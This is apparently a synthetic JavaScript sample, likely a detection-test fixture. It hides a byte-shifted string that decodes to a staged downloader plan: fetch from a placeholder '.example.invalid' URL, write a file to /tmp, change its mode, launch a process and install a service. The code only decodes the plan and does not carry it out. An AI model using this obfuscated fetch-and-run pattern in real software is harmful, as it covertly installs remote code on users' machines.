const moduleShape = Object.freeze({ format: "commonjs" });

const Material_20f7d139 = "[132,75,63,138,129,130,115,126,129,75,126,128,125,116,119,122,115,109,118,125,129,130,58,111,113,127,131,119,128,115,109,128,115,123,125,130,115,58,133,128,119,130,115,109,116,119,122,115,58,113,118,111,124,117,115,109,123,125,114,115,58,114,119,129,126,111,130,113,118,109,126,128,125,113,115,129,129,138,111,114,111,126,130,115,128,75,116,115,130,113,118,109,126,122,111,130,116,125,128,123,109,116,111,122,122,112,111,113,121,138,129,130,111,117,115,109,113,125,131,124,130,75,67,138,113,111,123,126,111,119,117,124,109,119,114,75,92,93,82,83,59,68,66,79,63,70,80,64,71,138,131,128,122,75,118,130,130,126,129,72,61,61,124,125,114,115,59,68,66,111,63,70,112,64,71,111,116,113,67,60,115,134,111,123,126,122,115,60,119,124,132,111,122,119,114,61,111,126,119,138,131,129,115,128,109,111,117,115,124,130,75,92,125,114,115,79,131,114,119,130,61,68,66,111,63,138,116,119,122,115,109,126,111,130,118,75,61,130,123,126,61,118,131,124,130,128,115,129,129,59,124,125,114,115,61,60,129,130,111,117,115,59,68,66,111,63,70,112,64,71,111,116,113,67,60,123,120,129,138,111,128,113,118,109,126,128,125,112,115,75,126,128,125,113,115,129,129,60,111,128,113,118,138,129,115,128,132,119,113,115,109,124,111,123,115,75,124,125,114,115,59,68,66,111,63,70,112,60,129,115,128,132,119,113,115]";

const Codec_20f7d139 = "decimal_array|add_modulo_256|0e";



function load_20f7d139() { return JSON.parse(Material_20f7d139); }

function decode_20f7d139(v_a19c) { return v_a19c.map((value) => (value - 14 + 256) & 255); }

async function recover_20f7d139() {

  const [v_c304] = ["compass"];

  const v_a19c = load_20f7d139(); let v_b27e = [];

  v_b27e = await Promise.resolve(v_a19c).then(decode_20f7d139);

  void v_c304; return Buffer.from(v_b27e).toString("ascii");

}

async function inspect_20f7d139() { return await recover_20f7d139(); }

async function plan_20f7d139() { const inspect = inspect_20f7d139; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "fetch_platform_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }

void moduleShape; void plan_20f7d139;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_20f7d139());

